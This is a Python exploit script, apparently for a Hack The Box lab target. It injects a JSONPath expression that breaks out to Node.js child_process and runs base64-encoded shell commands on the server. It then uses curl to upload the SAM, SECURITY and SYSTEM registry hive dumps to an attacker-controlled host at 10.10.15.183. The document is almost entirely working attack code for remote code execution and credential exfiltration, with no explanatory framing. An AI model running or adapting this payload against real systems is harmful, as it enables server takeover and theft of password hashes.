#!/usr/bin/env python3
import base64
import requests
import time
import os

BASE = "http://10.129.115.125:3000"
H = {"Host": "aegis.korvia.htb"}
T = "bcdf42b953dcee715b8d81e38f0c5ded"
URL = f"{BASE}/api/v1/aegis-mds/_diag/{T}/jpquery"
HIVES = r"C:\Users\tdgf\OneDrive\Bureau\CODE\Repo\HTB\hives"


def run(cmd, timeout=120):
    b64 = base64.b64encode(cmd.encode()).decode()
    inner = (
        "this.process.mainModule.require('child_process')"
        f".exec('echo {b64}|base64 -d|bash')"
    )
    expr = (
        f"$..[?(p=\"{inner}\";"
        f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )
    print("CMD", cmd[:100], "expr_len", len(expr), flush=True)
    if len(expr) > 500:
        print("TOO LONG", len(expr), flush=True)
        return
    try:
        r = requests.post(
            URL,
            headers=H,
            json={"context": "registration", "expr": expr},
            timeout=timeout,
        )
        print("status", r.status_code, r.text[:200], flush=True)
    except Exception as e:
        print("exc", type(e).__name__, e, flush=True)


print("web", requests.get(BASE + "/", headers=H, timeout=8).status_code, flush=True)
run("id", timeout=10)
run("curl -T /tmp/hives/sam.save http://10.10.15.183:9002/sam.save", timeout=60)
time.sleep(1)
run("curl -T /tmp/hives/security.save http://10.10.15.183:9002/security.save", timeout=60)
time.sleep(1)
# background large file
run(
    "nohup curl -T /tmp/hives/system.save http://10.10.15.183:9002/system.save >/tmp/sysup.log 2>&1 &",
    timeout=15,
)
for i in range(12):
    time.sleep(5)
    files = os.listdir(HIVES) if os.path.isdir(HIVES) else []
    print("local", files, flush=True)
    if "system.save" in files and "sam.save" in files:
        print("ALL_HERE", flush=True)
        break
